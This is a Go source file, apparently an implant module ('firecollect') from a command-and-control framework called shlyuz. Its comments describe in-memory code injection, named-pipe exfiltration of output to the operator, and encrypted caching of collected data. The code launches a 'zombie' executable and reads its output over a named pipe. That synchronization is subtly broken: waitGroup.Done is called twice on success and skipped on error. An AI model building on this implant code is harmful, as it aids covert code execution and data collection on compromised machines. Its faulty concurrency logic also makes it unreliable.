//go:build implant && (!lp || !teamserver)

package firecollect

import (
	"log"
	"os"
	"os/exec"
	"shlyuz/pkg/component"
	"shlyuz/pkg/execution/ipc"
	"sync"
)

// Load, execute, unload when execute is complete, can be with a return code, or when directed by the loader
//
//		Can open an output pipe to return additional data, but can't receive data outside of execution
//	 Permits memory injection of code which is executed, possibly continuing beyond the return, and has an output path to the user
//	 Also permits the loader to trigger the module to quit.
//	 Returns a null-terminated windows named pipe. Module may write arbitrary data to the pipe in the course of its execution, loader's responsibility to convey the written data to the user for analysis.
//	  On the teamserver, the contents of `pipename` will be sent over a unix pipe attached to the module's handler process.
//	  This module should consider this a write-only pipe. Will not receive any data input on this pipe
//	  Loader is responsiuble for closing the pipe if it must exit prior to the module. The module must detect this closure and cease writing to the pipe. Loader is responsible for closing this pipe after module execution ends.
//	  "Loader may cache output for transmissions. Must be cached to disk, and must be encrypted prior to writing to disk". Implant component will nto interact in any way with the data sent over this pipe exepct to pass it to the implant component
//
// Pipe Comms Order:
// * Implant creates the pipe
// * Implant opens implant side handle to the pipe
// * Implant passes pipe name to the module via load (execute) invocation
// * Module opens module-side handle to the pipe
// * Module returns from execute
// * Module  and implant communicate via pipe
// * Module closes module side handle to pipe
// * Implant detects that module has closed module-side handle to pipe and closes implant side handle in response
// * Once all handles to the pipe are closed, implant frees the pipe
// In addition to this order, both the implant and modyule must be able to handle a pipe being close unexpectedly. In this situation the implant or module must clsoe its own open handle, and react as appropriate
var waitGroup sync.WaitGroup

// TODO: Make this from go embed
func launchZombie(zombiePath string, namedPipe string) error {
	cmd := exec.Command(zombiePath, namedPipe)
	cmd.Stdout = os.Stdout

	if err := cmd.Run(); err != nil {
		return err
	}

	defer waitGroup.Done()
	return nil
}

func Execute(cmd string, execChannels *component.ComponentExecutionChannel, zombiePath string) (string, error) {
	var output string
	namedPipe := ipc.CreateNamedPipe()
	waitGroup.Add(1)

	go launchZombie(zombiePath, namedPipe)

	output = ipc.Read(namedPipe)

	waitGroup.Wait()

	if err := os.Remove(namedPipe); err != nil {
		log.Printf("failed to execute %s. Error: %s", zombiePath, err.Error())
		return "", err
	}

	defer waitGroup.Done()
	return output, nil
}
